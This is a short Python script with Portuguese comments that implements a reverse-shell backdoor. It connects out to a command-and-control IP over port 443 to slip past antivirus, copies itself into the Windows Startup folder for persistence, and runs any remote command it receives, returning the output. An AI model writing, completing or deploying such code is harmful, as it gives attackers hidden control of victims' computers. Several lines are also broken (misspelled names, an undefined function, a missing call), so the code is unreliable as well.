import socket
import subprocess
import threading
import time
import os

CCIP = "" #Entrar com IP
CCPORT = 443  #Porta de segurança do HTTPs, toda vez que a máquina da vítima 
                #se conecta ao servidor. O Antívirus permite o acesso. 

def autorun(): #Função para manter acesso a máquina, mesmo após desligar e religar.
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe") #Substituir .py por .exe(executável).

    os.system("copy {} \"%APPDATA%\\microsoft\\Windows\\Start Menu\\Programas\\Startup".format(exe_file))


def cmd(cliente, data): #Função para receber os dados do cliente.
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIP)
        #Proc fornece acesso aos subcomandos do windows.
        output = proc.stdout.read + proc.stderr.read() #Realizar a leitura na primeira parte, trata o erro na segunda.
        client.send(output + b"\n")

    except Exception as error: #Exceção para caso não dê certo ele aponte um erro.
        print(error)

def conn(CCIP, CCCPORT):
    try: 
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Abre a conexão
        client.connect((CCIP, CCPORT)) #Começa a conexão
        return client
    except Exception as error:
        print(error)

def client(cliente): #Checar toda vez se a conexão ainda esta "viva"
    try:
        while True:
            data = cliente.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        client.close()

if __name__ == "__main__": #Se o cliente nessa função for igual ao cliente em cima, ele vai fornecer o tratamento.
    autorun()
    while True:
        client= conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(10)